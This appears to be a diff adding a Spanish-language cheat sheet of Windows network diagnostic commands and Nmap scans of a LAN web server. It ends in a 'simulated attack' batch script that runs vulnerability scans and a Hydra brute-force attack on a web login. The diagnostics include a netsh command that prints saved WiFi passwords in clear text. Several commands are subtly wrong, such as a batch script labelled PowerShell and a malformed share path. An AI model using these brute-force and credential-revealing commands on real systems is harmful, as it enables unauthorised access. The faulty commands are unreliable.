@@ -1,0 +1,86 @@
+### Comandos de Diagnóstico de Redes en un Equipo Windows
+
+# Ver la configuración de red actual
+ipconfig /all
+
+# Ver la tabla de enrutamiento del equipo
+route print
+
+# Ver la dirección MAC de la interfaz de red
+getmac
+
+# Diagnóstico de conectividad con otro dispositivo
+ping 192.168.1.1
+
+# Trazar la ruta hacia un destino
+tracert 192.168.1.1
+
+# Mostrar las conexiones activas y los puertos en uso
+netstat -an
+
+# Mostrar detalles de las conexiones activas
+netstat -s
+
+# Ver las conexiones establecidas por un proceso específico
+tasklist | findstr "PID"
+
+# Renovar la dirección IP asignada por DHCP
+ipconfig /release && ipconfig /renew
+
+# Vaciar la caché de DNS
+ipconfig /flushdns
+
+# Ver los registros de la caché de DNS
+ipconfig /displaydns
+
+# Probar la conectividad con un puerto específico usando Telnet
+telnet 192.168.1.1 80
+
+# Comprobar la accesibilidad de un recurso compartido
+net use \192.168.1.1\share
+
+# Ver la configuración del firewall
+netsh advfirewall show allprofiles
+
+# Mostrar interfaces de red disponibles
+netsh interface show interface
+
+# Listar redes WiFi disponibles
+netsh wlan show networks
+
+# Ver detalles de una red WiFi guardada
+netsh wlan show profiles name="SSID" key=clear
+
+### Comandos Nmap para Escaneo de un Servidor Web en la LAN en Windows
+
+# Escaneo básico de puertos abiertos
+nmap 192.168.0.1
+
+# Escaneo detallado con detección de servicios y versiones
+nmap -sV 192.168.0.1
+
+# Escaneo de vulnerabilidades con scripts de Nmap
+nmap --script vuln 192.168.0.1
+
+# Escaneo de puertos comunes en modo agresivo
+nmap -A 192.168.0.1
+
+# Escaneo de puertos específicos
+nmap -p 80,443,8080 192.168.0.1
+
+# Escaneo de sistema operativo y detalles adicionales
+nmap -O 192.168.0.1
+
+# Escaneo con bypass de firewall
+nmap -f 192.168.0.1
+
+# Script de ataque simulado con Nmap en Windows (usando PowerShell)
+@echo off
+echo Iniciando escaneo de vulnerabilidades en 192.168.0.1
+nmap --script=http-vuln* -p 80,443 192.168.0.1 > vulnerabilidades.txt
+echo Escaneo finalizado. Analizando resultados...
+findstr /C:"VULNERABLE" vulnerabilidades.txt
+
+echo Simulación de fuerza bruta en login web (requiere Hydra)
+hydra -l admin -P passwords.txt 192.168.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+echo Ataque simulado finalizado.
